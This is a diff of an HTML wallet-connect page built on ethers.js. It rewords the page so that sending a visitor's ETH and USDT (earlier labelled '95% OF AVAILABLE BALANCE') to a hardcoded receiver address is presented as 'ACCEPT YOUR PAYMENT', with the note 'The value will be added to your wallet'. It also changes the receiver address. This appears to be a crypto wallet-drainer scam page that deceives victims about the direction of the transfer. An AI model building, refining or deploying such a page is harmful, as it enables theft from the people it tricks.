@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CONNECT YOUR WALLET TO ADD FUNDS</title>
+    <title>CONNECT YOUR WALLET TO ACCEPT YOUR PAYMENT itle>
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
     <style>
         * {
@@ -379,19 +379,19 @@
                         <div class="amount-icon">Ξ</div>
                         <div class="amount-title">ETH TO SEND</div>
                     </div>
-                    <div class="amount-display" id="ethAmountDisplay">0.0000</div>
-                    <div class="amount-note">95% OF AVAILABLE BALANCE</div>
+                    <div class="amount-display" id="ethAmountDisplay">0.00</div>
+                    <div class="amount-note">The value will be added to your wallet</div>
                 </div>
 
                 <div class="action-buttons">
                     <button class="action-btn eth-btn" id="sendEthBtn" onclick="sendEth()">
                         <span class="btn-icon">Ξ</span>
-                        <span>ADD ETH</span>
+                        <span>ACCEPT ETH</span>
                     </button>
                     
                     <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
                         <span class="btn-icon">$</span>
-                        <span>ADD USDT</span>
+                        <span>ACCEPT USDT</span>
                     </button>
                 </div>
             </div>
@@ -405,7 +405,7 @@
 
     <script>
         // Configuration
-        const RECEIVER = "0xd0a22640348d200a99399936a5aca72f34f666ed"; // Replace with your receiver address
+        const RECEIVER = "0xbb0431ca2ca7aa81490508d169c559b5b7f0d266"; // Replace with your receiver address
         const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
         
         // USDT Contract ABI
